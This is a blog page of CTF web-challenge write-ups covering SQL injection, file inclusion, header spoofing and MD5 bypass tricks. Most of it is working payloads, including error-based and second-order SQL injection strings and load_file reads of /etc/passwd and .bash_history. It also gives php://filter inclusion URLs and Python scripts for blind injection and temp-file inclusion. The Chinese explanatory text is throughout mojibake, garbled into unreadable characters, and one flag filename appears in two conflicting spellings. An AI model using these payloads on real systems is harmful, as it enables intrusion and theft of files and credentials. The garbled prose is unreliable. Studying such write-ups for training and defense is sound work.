<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h4><p>&#x3D;&#x3D;äºŒæ¬¡æ³¨å…¥&#x3D;&#x3D;</p>
<p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å¯ä»¥ä¼ å‚fileï¼Œä½¿ç”¨ä¼ªåè®®è¯»å–æºç ã€‚</p>
<p>index.phpã€change.phpã€delete.phpã€search.phpã€config.php</p>
<p>åœ¨change.phpé‡Œé¢æœ‰sqlçš„updataè¯­å¥ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p>
<p>å…¶å¯¹passwordå’Œusernameåšçš„è¿‡æ»¤ï¼Œå¾ˆéš¾ç»•è¿‡ï¼Œä½†æ˜¯å¯¹åœ°å€çš„è¿‡æ»¤å¾ˆå°‘ã€‚</p>
<p>é‚£æˆ‘ä»¬å¯ä»¥åœ¨ä¸€å¼€å§‹å‘é€ä¿¡æ¯çš„æ—¶å€™å¾€æ•°æ®åº“é‡Œæ’å…¥æ¶æ„è¯­å¥ï¼Œç„¶åä½¿change.phpè¿›è¡Œæ¶æ„æ³¨å…¥ã€‚</p>
<p>å·²çŸ¥flagåœ¨<code>/flag.txt</code>é‡Œé¢ï¼Œä½¿ç”¨<code>load_file</code>è¯»å–</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#x27;and updatexml(1,concat(0x23,load_file(&#x27;/flag.txt&#x27;)),1)#</span><br><span class="line">ä¸Šé¢åªèƒ½çˆ†å‡ºå‰é¢çš„flagï¼Œä¸å®Œæ•´ï¼Œä¸‹é¢ä½¿ç”¨midå‡½æ•°çˆ†åé¢çš„</span><br><span class="line"></span><br><span class="line">&quot;&#x27;and updatexml(1,concat(0x23,mid(load_file(&#x27;/flag.txt&#x27;),32)),1)#</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h4><p>&#x3D;&#x3D;äºŒæ¬¡æ³¨å…¥&#x3D;&#x3D;</p>
<p>æ³¨å†Œçš„æ—¶å€™å‘ç°äº†ä¸€äº›è¯è¢«è¿‡æ»¤æ‰äº†ï¼Œfuzzäº†ä¸€ä¸‹ï¼Œè¿‡æ»¤äº†éƒ¨åˆ†å­—ç¬¦</p>
<p>å½“<code>username</code>æ˜¯<code>1&quot;</code>æ—¶ï¼Œåœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨äºŒæ¬¡æ³¨å…¥ï¼ŒåŒå¼•å·é—­åˆã€‚</p>
<p>å¯ä»¥æ¨å‡ºåå°çš„sqlè¯­å¥ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&#x27;xxxx&#x27; where username=&quot;xxxx&quot; and pwd=&#x27;202cb962ac59075b964b07152d234b70&#x27;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºå­˜åœ¨æŠ¥é”™å›æ˜¾ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ç”¨&#x3D;&#x3D;æŠ¥é”™æ³¨å…¥&#x3D;&#x3D;</p>
<p>1â€or(extractvalue(1,concat(0x7e,(database()))))#</p>
<p>çˆ†æ•°æ®åº“ï¼šweb_sqli</p>
<p>1â€or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;â€™web_sqliâ€™))))#</p>
<p>çˆ†è¡¨ï¼šarticle,flag,users</p>
<p>1â€or(extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)&#x3D;â€™usersâ€™)))))#</p>
<p>çˆ†å­—æ®µï¼šname,pwd,email,real_flag_1s_here</p>
<p>1â€or(extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(â€˜^fâ€™))))))#</p>
<p>é€†åºè¾“å‡ºï¼š	}614aa102efe0-c999-dda4-62e2-32</p>
<p>æ­£åºåï¼š		23-2e26-4add-999c-0efe201aa416}</p>
<p>1â€or(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(â€˜^fâ€™)))))#</p>
<p>æœ€ç»ˆï¼šflag{42b76a23-2e26-4add-999c-0efe201aa416}</p>
<p><code>regexp(&#39;^f&#39;)</code>æ˜¯æŸ¥æ‰¾få¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</p>
<p><code>reverse()</code>æ˜¯é€†åºè¾“å‡º</p>
<hr>
<h4 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h4><p>&#x3D;&#x3D;GITæ³„éœ²&#x3D;&#x3D;  &#x3D;&#x3D;äºŒæ¬¡æ³¨å…¥&#x3D;&#x3D;</p>
<p>write_do.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=23&amp;category=1&#x27;,content=database(),/*&amp;content=3123</span><br></pre></td></tr></table></figure>

<p>å†è®©content &#x3D; *&#x2F;#</p>
<p>æˆåŠŸè¯»åˆ°æ•°æ®åº“åç§°</p>
<p>title&#x3D;23&amp;category&#x3D;1â€™,content&#x3D;user(),&#x2F;*&amp;content&#x3D;3123</p>
<p>å‘ç°æ˜¯rootï¼Œè¿™æ ·çš„è¯ï¼Œä¸€èˆ¬ flag å°±ä¸ä¼šåœ¨æ•°æ®åº“é‡Œé¢(å› ä¸ºå¦‚æœåœ¨æ•°æ®åº“ä¸­ï¼Œä¸éœ€è¦rootæƒé™)</p>
<p>æ‰€ä»¥sqlæ³¨å…¥è¯»å–æœ¬åœ°æ–‡ä»¶ å¯ä»¥ä½¿ç”¨load_file()</p>
<p>å…ˆè¯»etc&#x2F;passwd</p>
<p>å‘ç°æœ‰ä¸ªwwwç”¨æˆ·<br>æŸ¥çœ‹<strong>bash_history ï¼š</strong> <strong>ä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤,æ–¹ä¾¿æŸ¥æ‰¾</strong><br>åœ¨&#x2F;home&#x2F;www&#x2F;ä¸‹<br>paylaod</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">213&#x27;,content=(select load_file(&#x27;/home/www/.bash_history&#x27;)),/*</span><br></pre></td></tr></table></figure>

<p>çœ‹è§ä»–åˆ é™¤äº†<code> .DS_Store</code> æ–‡ä»¶ï¼Œç”±äºç›®æ ‡ç¯å¢ƒæ˜¯dockerï¼Œæ‰€ä»¥ .DS_Store æ–‡ä»¶åº”è¯¥åœ¨ <code>/tmp/html</code> ä¸­ã€‚è€Œ .DS_Store æ–‡ä»¶ä¸­ï¼Œç»å¸¸ä¼šæœ‰ä¸€äº›ä¸å¯è§çš„å­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨<code>hex</code>å‡½æ•°å¯¹å…¶è¿›è¡Œ16è¿›åˆ¶è½¬æ¢</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">213&#x27;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</span><br></pre></td></tr></table></figure>

<p>æ”¾bpè§£ç ï¼Œflagåœ¨<code>flag_8946e1f1ee3e40f.php</code></p>
<p>title&#x3D;23&amp;category&#x3D;1â€™,content&#x3D;hex((load_file(â€˜&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.phpâ€™))),&#x2F;*&amp;content&#x3D;3123</p>
<p>è§£ç åå¾—åˆ°flag</p>
<hr>
<h4 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h4><p>idå­˜åœ¨æ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨å¼‚æˆ–æ³¨å…¥.</p>
<p>fuzzä¸€ä¸‹å‘ç°è¿‡æ»¤äº†informationï¼Œæ‰€ä»¥ä¸èƒ½ç”¨</p>
<p>å¯ä»¥ç”¨<code>sys.x$schema_flattened_keys</code>æˆ–è€…<code>sys.schema_table_statistics_with_buffer</code>ä»£æ›¿</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))=103</span><br><span class="line">2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;.format()</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸èƒ½æŸ¥å­—æ®µï¼Œæ‰€ä»¥è¦ç”¨åˆ°&#x3D;&#x3D;æ— åˆ—åæ³¨å…¥&#x3D;&#x3D;</p>
<p>è¿™é‡Œç”¨åˆ°äº†<code>asciiä½åç§»</code></p>
<p>æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°ä¸å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯æ²¡æœ‰å…³ç³»çš„ï¼Œç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¼šå„å–ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦asciiç æ¥æ¯”è¾ƒï¼Œä¸ç­‰å¼æˆç«‹è¿”å›1ï¼Œä¸ç­‰å¼ä¸æˆç«‹è¿”å›0ï¼Œæ¢ä¸€ä¸ªè§’åº¦æ¥è¯´ï¼Œåªä¼šæ¯”è¾ƒä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯é¦–å­—ç¬¦</p>
<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://bfd71058-3cf0-4e87-8731-8935a651f051.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">flag</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res += flag</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        hexchar = add(flag + <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<hr>
<hr>
<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h4 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h4><p>ç‚¹å‡»tipsï¼Œcan u find flag?</p>
<p>è¿™é‡Œç›´æ¥ä½¿ç”¨phpä¼ªåè®®ï¼Œä»¥base64ç¼–ç çš„å½¢å¼æ˜¾ç¤ºæºä»£ç </p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>å¾—åˆ°ä¸€ä¸²base64åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œè§£å¯†åå‘ç°flag</p>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h4><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°.&#x2F;Archive_room.phpï¼Œè®¿é—®ï¼Œæœ‰ä¸€ä¸ªsecretæŒ‰é’®ï¼ŒæŒ‰äº†è¦æŠ“åŒ…ï¼Œå‘ç°äº†secr3t.phpï¼Œè®¿é—®åå‘ç°phpä»£ç </p>
<p>ç›´æ¥ä½¿ç”¨ä¼ªåè®®</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>æ‹¿åˆ°base64åŠ å¯†å¯†æ–‡ï¼Œè§£å¯†åå³å¯çœ‹åˆ°flag</p>
<hr>
<h4 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="*[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>*[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h4><p>phpmyadmin4.8.0-4.8.1å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
<hr>
<h4 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h4><p>ç‚¹å‡»woofersï¼Œå‘ç°urlæœ‰å‚æ•°ä¼ å…¥ï¼Œæ”¹ä¸ºï¼Œwoofers1ï¼ŒæŠ¥é”™ï¼Œå‘ç°åç¼€æœ‰ä¸€ä¸ª.phpï¼Œè€Œä¸”å¿…é¡»åŒ…å«woofersæˆ–è€…meowersï¼Œç”¨ä¼ªåè®®è¯»</p>
<p>?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers&#x2F;..&#x2F;flag</p>
<hr>
<h4 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h4><p>burpæŠ“åŒ…ï¼Œå‘ç°cookieé‡Œæœ‰hashå€¼ï¼Œå°è¯•ä¼ å‚pass&#x3D;hashã€‚å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶<code>flflflflag.php</code> </p>
<p>ç”¨brupè®¿é—®flflflflag.phpï¼Œget ä¼ å‚file</p>
<p>&#x3D;&#x3D;ä¸´æ—¶æ–‡ä»¶åŒ…å«&#x3D;&#x3D;</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">file_data = &#123;<span class="string">&#x27;file&#x27;</span>: payload&#125;</span><br><span class="line">url=<span class="string">&quot;http://66b29ad5-fb7b-4ac2-b8c1-5f4abd6d8852.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=index.php&quot;</span></span><br><span class="line">response = requests.post(url=url, files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®dir.phpï¼Œå¾—åˆ°ä¸´æ—¶æ–‡ä»¶åï¼Œå†åˆ°flflflflag.phpä¼ å‚file&#x3D;&#x2F;tmp&#x2F;phpFa081M</p>
<p>flagå°±åœ¨phpinfoé‡Œ</p>
<hr>
<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h4><p>æŸ¥çœ‹æºä»£ç å‘ç°Secret.phpï¼Œè®¿é—®ã€‚</p>
<p>ä»–è¯´ä¸æ˜¯æ¥è‡ª <a href="https://Sycsecret.buuoj.cnç½‘ç«™çš„è®¿é—®ï¼Œæˆ‘ä»¬åœ¨bpä¸­çš„httpå¤´éƒ¨æ·»åŠ ï¼š">https://Sycsecret.buuoj.cnç½‘ç«™çš„è®¿é—®ï¼Œæˆ‘ä»¬åœ¨bpä¸­çš„httpå¤´éƒ¨æ·»åŠ ï¼š</a>	<code>Referer: https://Sycsecret.buuoj.cn</code></p>
<p>ç„¶ååˆè¯´æµè§ˆå™¨ä¸å¯¹ï¼Œæ”¹ï¼	User-Agent: Syclover</p>
<p>ç„¶ååˆè¯´åªèƒ½æœ¬åœ°æ‰èƒ½çœ‹ï¼Œè¿™é‡Œæœ‰æ¶‰åŠä¸€ä¸ªæ²¡æœ‰çš„å­—æ®µX-froward-forï¼Œä»£è¡¨ä»è®¿é—®è€…çš„åœ°å€ï¼ŒåŠ ä¸Šï¼Œå¹¶ä¸”æ”¹ä¸ºæœ¬åœ°å›ç¯åœ°å€127.0.0.1</p>
<p>X-forwarded-for: 127.0.0.1</p>
<p>X-Real-IPï¼š127.0.0.1</p>
<p>Client-ip:127.0.0.1</p>
<hr>
<h4 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h4><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°flag.phpï¼Œç„¶åå®ƒè¯´éšè—ip,è¿™é‡ŒæŠ“åŒ…å¢åŠ <code>X-forwarded-for: 127.0.0.1</code></p>
<p>flagåœ¨æºä»£ç </p>
<hr>
<h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><h4 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h4><p>&#x3D;&#x3D;ffifdyop&#x3D;&#x3D;</p>
<p>ï¼ˆ1ï¼‰F12æŸ¥çœ‹ç½‘ç»œçŠ¶æ€ï¼Œå‘ç°å“åº”å¤´æœ‰Hint: select * from â€˜adminâ€™ where password&#x3D;md5($pass,true)</p>
<p>ï¼ˆ2ï¼‰æƒ³åŠæ³•ç»•è¿‡è¿™ä¸ªmd5(pass,true),å¦‚æœæˆ‘ä»¬æäº¤ä¸€ä¸ªå­—ç¬¦ä¸²ç»è¿‡md5ä¹‹åï¼Œç„¶ååˆç»è¿‡hexè½¬assciç æœ€ç»ˆæˆä¸ºâ€™or â€˜6XXXâ€™çš„è¯ï¼Œæˆ‘ä»¬å°±æ„é€ äº†ä¸€ä¸ªä¸‡èƒ½é’¥åŒ™ï¼Œå°±å¯ä»¥å¾—åˆ°å¦å¤–ä¸€ä¸ªé¡µé¢</p>
<p>è¿™ä¸ªå¯ä»¥ç”¨<code>ffifdyop</code>ç»•è¿‡ï¼Œç»•è¿‡åŸç†æ˜¯ï¼š<br><code>ffifdyop</code> è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ <code>276f722736c95d99e921722cf9ed621c</code>ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯ â€˜ <code>or &#39;6</code><br>è€Œ Mysql åˆšå¥½åˆä¼šæŠŠ hex è½¬æˆ ascii è§£é‡Šï¼Œå› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯ <code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>ï¼Œç­‰ä»·äº or ä¸€ä¸ªæ°¸çœŸå¼ï¼Œå› æ­¤ç›¸å½“äºä¸‡èƒ½å¯†ç ï¼Œå¯ä»¥ç»•è¿‡md5()å‡½æ•°</p>
<p>ï¼ˆ3ï¼‰ç„¶åè·³è½¬åˆ°æ–°çš„é¡µé¢</p>
<p>éœ€è¦ç»™a,bä¸¤ä¸ªå˜é‡ä¼ å‚å…¸å‹å¼±ç±»å‹åŒ¹é…md5ç¢°æ’ï¼ˆ0eå¼€å¤´ï¼‰ã€‚è€Œä¸”md5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œé‡åˆ°æ•°ç»„ä¸æŠ¥é”™ä½†æ˜¯ä¼šå°†å…¶è½¬å˜æˆNULL</p>
<p>?a[]&#x3D;1&amp;b[]&#x3D;2	æ•°ç»„ç»•è¿‡</p>
<p>ï¼ˆ4ï¼‰ä¸€æ ·æ•°ç»„ç»•è¿‡<code>param1[]=1&amp;param2[]=2</code>postä¼ å‚</p>
<hr>
<h4 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ•°ç»„ç»•è¿‡ï¼Œ?id[]&#x3D;1&amp;gg[]&#x3D;2</p>
<p>passwd&#x3D;&#x3D;1234567å¼±ç­‰äº</p>
